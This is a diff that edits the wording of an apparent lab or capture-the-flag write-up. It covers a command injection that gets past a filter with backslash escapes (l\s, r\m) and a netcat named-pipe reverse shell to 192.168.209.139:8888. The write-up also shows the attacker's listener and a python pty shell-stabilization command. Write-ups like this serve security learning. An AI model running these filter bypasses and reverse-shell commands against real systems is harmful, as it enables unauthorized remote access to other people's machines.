@@ -67,12 +67,10 @@ From this note, we identified two usernames:
 ---
 # Command Injection
 
-Now lets try command Injection :
-
-If we try ls it filters the command
+When trying to execute the `ls` command, it was filtered :
 ![[Pasted image 20260209225117.png]]
 
-But if we use `\` with command `l\s` then it doesn't filters it.
+However, using a backslash bypass such as `l\s` allowed the command to execute :
 
 ![[Pasted image 20260209225434.png]]
 
@@ -81,13 +79,15 @@ But before executing the command we simply make rm > r\m .
 r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.209.139 8888 >/tmp/f
 ```
 
+Listener on attacker machine: 
 ```
 nc -lvnp 8888
 ```
 
 ![[Pasted image 20260209225622.png]]
 
-Now we use the command to stabilize the shell.
+---
+#Shell Stabilization :
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
